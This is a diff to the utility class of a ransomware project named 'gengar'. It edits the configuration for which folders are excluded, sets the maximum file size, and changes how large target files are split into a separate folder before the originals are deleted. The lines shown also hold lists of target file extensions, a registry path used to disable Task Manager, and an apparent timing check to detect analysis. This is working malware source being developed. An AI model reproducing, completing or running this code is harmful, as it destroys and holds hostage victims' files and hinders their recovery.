@@ -17,6 +17,8 @@ class Utils:
         Class with a wide variety of useful functionalities as well as other variables.
     """
 
+    TRIALDIR_PATH = r"C:\Users\Marqu\Downloads"
+
 
     # name of the Ransomware
     BRAND_NAME = 'gengar'
@@ -45,7 +47,7 @@ class Utils:
                       'ransomware',
                       'Boot',
                       'System Volume Information',
-                      'Vídeos']
+                      'Videos']
 
 
     # file extensions that must avoid from encrypting
@@ -66,7 +68,7 @@ class Utils:
                   '.ott', '.odt', '.pem', '.p12', '.csr', '.crt', '.key', '.pfx', '.der', '.py']
 
 
-    MAX_SIZE_FILE = 1000000000 # Maximum size of files must be 1 GB, otherwise file split is needed
+    MAX_SIZE_FILE = 1000000000/2 # Maximum size of files must be 1/2 GB, otherwise file split is needed
     DISABLE_TASKMANAGER_KEY_LOCATION = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
 
 
@@ -116,7 +118,8 @@ class Utils:
                         if ext in self.TARGET_EXT and ext not in self.EXCLUDED_EXT:
                             if os.path.getsize(full_path) > self.MAX_SIZE_FILE:
                                 print("splitting files...")
-                                dir_name = str(fn) + "_gengar_splitted_file"
+                                dir_name = str(full_path) + "_gengar_splitted_file"
+                                print(dir_name)
                                 os.mkdir(dir_name)
                                 fs.split(file=full_path, split_size=self.MAX_SIZE_FILE, output_dir=dir_name)
                                 os.remove(full_path)
@@ -281,7 +284,7 @@ class Utils:
             if (((t3-t2)/(t2-t1)) >= 10):
                 return True
         return False
-    
+
 
 # LINKS HERE
 # https://www.youtube.com/watch?v=UoMzCyB2IvE
